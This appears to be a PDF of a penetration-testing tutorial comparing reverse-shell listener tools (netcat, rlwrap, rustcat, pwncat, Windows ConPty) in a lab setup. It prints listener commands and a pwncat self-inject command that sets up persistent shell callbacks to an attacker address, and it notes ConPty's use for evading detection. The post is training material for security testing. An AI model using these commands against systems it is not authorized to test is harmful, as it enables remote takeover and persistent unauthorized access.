[[ PAGE 1 ]]
 
 
[[ PAGE 2 ]]
 
Contents 
Best Alternative of Netcat Listener ......................................................................................................... 3 
Reverse Shell Generator .......................................................................................................................... 3 
rlwrap for OSCP ....................................................................................................................................... 4 
Benefits of Rlwrap over Netcat ............................................................................................................... 5 
Rustcat for OSCP ..................................................................................................................................... 6 
Pwncat for Red Teamer ........................................................................................................................... 9 
Windows ConPty Shell .......................................................................................................................... 13 
 
 
 
 
[[ PAGE 3 ]]
Best Alternative of Netcat Listener 
Pentesters rely on a variety of tools to establish connections and maintain access during 
security assessments. One critical component of their toolkit is the listener—a program that 
listens for incoming connections and facilitates communication with compromised systems. 
 In this blog post, we'll delve into different listener options, exploring features and use cases 
for popular tools such as Netcat, Rlwrap, Rustcat, Pwncat and Windows ConPty shell. 
Table of Content 
• Reverse Shell Generator 
• Netcat for Bignners 
• Rlwrap for OSCP 
• Rustcat for OSCP 
• Pwncat for Read Teamers 
• Windows ConPty for OSCP  & Red Teamers 
 
Reverse Shell Generator 
In order to generate a reverse shell the https://www.revshells.com/ can be used as it provides 
a number of commands for the reverse shells and listeners based on the OS that can be used 
ideally in Remote command Execution based Scenario  
However there are my online and offline techniques can be used for Reverse Generator, read 
our previous blog “Easy way to Generate Reverse Shell” 
 
 
[[ PAGE 4 ]]
Netcat 
Netcat, often dubbed the "Swiss Army knife of networking," is a versatile tool for creating 
simple TCP and UDP connections. Its minimalist design and broad functionality make it a 
favorite among pentesters. Key features include: 
• Basic Connectivity 
• Port Scanning 
• File Transfer 
• Remote Shell Access 
A netcat listerner is started at port 4444 in the kali machine. Following is the command for the 
netcat listener: 
nc -lnvp 4444 
 
After generating the command from reverse shell generator, the command for reverse shell is 
used in the ubuntu OS.  
 
After running the above command in the ubuntu OS, a reverse shell is obtained in the kali 
machine.  
Limitation: However, it is observed that after pressing the upper arrow key to reuse the 
previous command the terminal does not completes the command. 
 
rlwrap for OSCP 
rlwrap, short for "readline wrapper" enhances the usability of command-line interfaces. 
While not a dedicated listener tool, it improves the experience of interacting with shell-
based tools like Netcat through: 
• Command Line History 
• Autocompletion 
[[ PAGE 5 ]]
Benefits of Rlwrap over Netcat 
rlwrap adds command history and editing capabilities to Netcat sessions, simplifying 
command recall and modification. Pentesters benefit from rlwrap's tab-completion feature, 
speeding up command entry by suggesting possible completions based on the current input. 
Installation of rlwrap is simple, just use the following command: 
apt install rlwrap 
 
After installation repeat the entire process followed in the netcat section, but for reverse 
shell use the following listener command to use the rlwrap: 
rlwrap nc -lvnp 4444 
Advantage: Observe that the after the reverse shell is obtained, the command can be 
autocompleted and reused. 
 
 
[[ PAGE 6 ]]
Rustcat for OSCP 
Rustcat, a modern reimplementation of Netcat in the Rust programming language, aims to 
provide improved performance and security while retaining Netcat's functionality. Key 
reasons for its adoption include: 
• 
Serves it purpose of listening to ports 
• 
Grab History 
• 
User-friendly 
• 
Supports udp 
• 
Uses colors 
Rustcat leverages Rust's memory safety features, reducing the likelihood of common 
vulnerabilities such as buffer overflows. Its design enables concurrent connections, allowing 
pentesters to handle multiple sessions efficiently. Like Netcat, Rustcat is available on multiple 
platforms, ensuring compatibility across different operating systems. 
Installation of Rustcat can be done using cargo, the following command can be used: 
apt install cargo 
 
cargo install rustcat 
[[ PAGE 7 ]]
 
Make sure to add the /root/.cargo/bin to the path 
 
echo $SHELL 
nano .zshrc 
 
Add the /root/.cargo/bin as Export Path. 
 
[[ PAGE 8 ]]
After installation repeat the entire process followed in the netcat section, but for reverse 
shell use the following listener command to use the rustcat: 
rcat listen -ib 1234 
Advantage: Observe that the tab completion is enable in rcat and can be used to 
autocomplete the commands. 
 
Observe that the tab completion is enable in rcat and can be used to autocomplete the 
commands.  
 
However, it has more dynamic features such UDP  (-lpu) connection and History function (-
lpH)   
[[ PAGE 9 ]]
Pwncat for Red Teamer 
Pwncat, a feature-rich netcat-like tool designed for pentesters and red teamers, offers 
several enhancements over traditional Netcat: 
• Interactive Shell 
• Scriptable Interface 
• Encrypted Communication 
• Persistance 
Pwncat provides an interactive shell with syntax highlighting and command completion, 
improving the user experience. Pentesters can automate tasks using Pwncat's Python 
scripting interface, allowing for greater flexibility and customization. It also supports 
encrypted communication channels, ensuring confidentiality when interacting with 
compromised systems. 
Installation of pwncat can be done using pip, the following command can be used: 
pip install pwncat 
 
After installation repeat the entire process followed in the netcat section, but for reverse 
shell use the following listener command to use the pwncat: 
pwncat -l 1234 --self-inject /bin/bash:192.168.1.7:1234 
Advantage: Observe that pwncat holds a persistence by creating a file in the /tmp/ directory. 
Therefore, if a connection is lost the reverse shell can still be obtained at the same port which 
was previously used like a persistence  
[[ PAGE 10 ]]
 
[[ PAGE 11 ]]
The persistence can be checked by running a rlwrap listener at the same port after 
terminating the above connection. 
 
Pwncat has a feature to create persistence on multiple ports which can be performed using 
the following commands: 
pwncat -l 1234 --self-inject /bin/bash:192.168.1.7:1234+2 
 
[[ PAGE 12 ]]
 
It can be observed that along with port 1234, the reverse shell can also be obtained on the 
ports 1235 and 1236. 
[[ PAGE 13 ]]
 
Windows ConPty Shell 
The Windows ConPty shell, a more recent addition to the pentester's arsenal, leverages the 
ConPty functionality introduced in Windows 10. It offers several advantages over traditional 
shells: 
[[ PAGE 14 ]]
• Improved TTY 
• Stability and Compatibility 
• Evasion Techniques 
ConPty shell provides improved TTY functionality, allowing for a more interactive experience, 
including proper handling of command line utilities like Vim and Python.  
Advantage: It is more stable and compatible with modern Windows systems, providing a 
reliable option for post-exploitation activities. Pentesters can utilize ConPty shell to bypass 
security mechanisms by avoiding traditional detection methods. 
Reverse shell generator can be used for the listener command and the reverse shell payload. 
 
For starting the listener at port 443 in the kali machine the command can be used from the 
reverse shell generator website. 
[[ PAGE 15 ]]
 
Now using the reverse shell payload in the windows machine and running the command 
copied from reverse shell generator. 
 
Observe that the reverse shell is obtained at port 443 and it is a fully interactive session. 
 
Conclusion 
In conclusion, pentesters have a diverse range of listener options available, each offering 
unique features and benefits. Whether it's the simplicity of Netcat, the usability 
enhancements of Rlwrap, the performance and security of Rustcat, the advanced capabilities 
of Pwncat, or the modern functionality of the Windows ConPty shell, selecting the right tool 
depends on the specific requirements of the assessment.  
By understanding the strengths and weaknesses of these tools, pentesters can effectively 
establish and maintain access during security engagements. 
[[ PAGE 16 ]]
JOIN OUR
TRAINING PROGRAMS
www.ignitetechnologies.in
BEGINNER
Network Pentest
Bug Bounty
Wireless Pentest
Network Security
Essentials
Ethical Hacking
ADVANCED
EXPERT
Burp Suite Pro
CTF
Windows
Linux
Pro
Infrastructure VAPT
APT’s - MITRE Attack Tactics
MSSQL Security Assessment
Active Directory Attack
Red Team Operation
Privilege Escalation
Web
Services-API
Android Pentest
Computer
Forensics
Advanced
Metasploit
CLICK HERE
